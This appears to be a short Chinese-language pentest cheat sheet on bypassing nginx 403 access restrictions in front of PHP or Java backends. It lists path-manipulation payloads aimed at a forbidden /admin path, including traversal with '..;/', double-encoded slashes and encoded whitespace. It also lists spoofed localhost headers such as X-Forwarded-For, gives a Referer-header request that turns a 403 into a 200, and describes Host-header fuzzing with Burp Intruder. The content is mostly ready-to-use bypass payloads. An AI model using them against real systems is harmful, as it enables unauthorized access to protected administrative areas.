## 0x00 技术背景

       之前碰过几个项目，中间件nginx做反向代理，后端代码是PHP或者JAVA，过nginx一般会识别ip，从而限制攻击者访问敏感路径，所以可以通过绕过方式限制nginx
       
       
## 0x01 forbidden绕过


      site.com/admin => 403
      site.com/admin/ => 200
      site.com/random-dir/../admin => 200
      site.com/random-dir/..;/admin => 200
      site.com/random-dir/..%252F/admin => 200
      site.com/admin// => 200
      site.com//admin// => 200
      site.com/admin/* => 200
      site.com/admin/*/ => 200
      site.com/admin/. => 200
      site.com/admin/./ => 200

      site.com/./admin/./ => 200
      site.com/admin/./. => 200
      site.com/admin/./. => 200
      site.com/admin? => 200
      site.com/admin?? => 200
      site.com/admin??? => 200
      site.com/admin..;/ => 200
      site.com/admin/..;/ => 200
      site.com/%2f/admin => 200
      site.com/%2e/admin => 200
      site.com/admin%20/ => 200
      site.com/admin%09/ => 200
      site.com/%20admin%20/ => 200
      site.com/%0dadmin => 200
      
## 0x02 添加各种头

     - X-Originating-IP: 127.0.0.1
     - X-Remote-IP: 127.0.0.1
     - X-Client-IP: 127.0.0.1
     - X-Forwarded-For: 127.0.0.1
     - X-Forwared-Host: 127.0.0.1
     - X-Host: 127.0.0.1
     - X-Custom-IP-Authorization: 127.0.0.1
     
      Referer 请求头包含了当前请求页面的来源页面的地址，即表示当前页面是通过此来源页面里的链接进入的。服务端一般使用 Referer 请求头识别访问来源。
      
      GET /auth/login HTTP/1.1
      Host: xxx
      Response
      HTTP/1.1 403 Forbidden

      Reqeust
      GET / HTTP/1.1
      Host: xxx
      ReFerer:https://xxx/auth/login
      Response
      HTTP/1.1 200 OK

      之前碰见个项目，访问后台，提示403，添加Referer提示302成功


## 0x03 修改host头

      我们先说下 Host 在请求头中的作用，在一般情况下，几个网站可能会部署在同一个服务器上，或者几个 web 系统共享一个服务器，通过 host 头来指定应该由哪个网站或者 web 系统来处理用户       的请求。
      而很多 WEB 应用通过获取 HTTP HOST 头来获得当前请求访问的位置，但是很多开发人员并未意识到 HTTP HOST 头由用户控制，从安全角度来讲，任何用户输入都是认为不安全的。
      当服务器获取 HOST 的方式不当时，我们可以通过修改 Host 值来进行绕过。首先对该目标域名进行子域名收集，整理好子域名资产（host 字段同样支持 IP 地址）。先 Fuzz 测试跑一遍收集到       的子域名，这里使用的是 Burp 的 Intruder 功能。
